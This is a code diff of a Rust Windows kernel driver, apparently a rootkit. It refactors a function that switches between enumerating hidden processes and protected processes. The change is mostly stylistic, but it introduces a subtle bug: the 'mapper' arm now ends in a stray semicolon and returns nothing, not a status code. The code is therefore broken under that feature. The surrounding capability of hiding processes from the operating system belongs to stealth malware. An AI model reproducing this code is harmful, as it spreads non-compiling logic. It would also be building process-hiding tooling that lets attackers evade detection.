@@ -177,7 +177,7 @@ impl Process {
 
     /// Toggles the enumeration between hiding or protecting processes based on the options provided.
     ///
-    /// # Arguments
+    /// # Parameters
     /// - `input_target`: Pointer to the enumeration information input structure.
     /// - `info_process`: Information structure of processes.
     /// - `information`: Pointer to a variable to store information size.
@@ -186,23 +186,19 @@ impl Process {
     /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
     /// 
     pub unsafe fn enumerate_process_toggle(input_target: *mut EnumerateInfoInput, info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
-        let status;
-        
         match (*input_target).options {
             Options::Hide => {
-                status = Self::enumerate_hide_processes(info_process, information);
+                Self::enumerate_hide_processes(info_process, information)
             },
             #[cfg(not(feature = "mapper"))]
             Options::Protection => {
-                status = callback::enumerate_protection_processes(info_process, information);
+                callback::enumerate_protection_processes(info_process, information)
             },
             #[cfg(feature = "mapper")]
             Options::Protection => {
-                status = wdk_sys::STATUS_INVALID_DEVICE_REQUEST;
+                wdk_sys::STATUS_INVALID_DEVICE_REQUEST;
             },
         }
-
-        status
     }
 
     /// Enumerate Processes Hide.
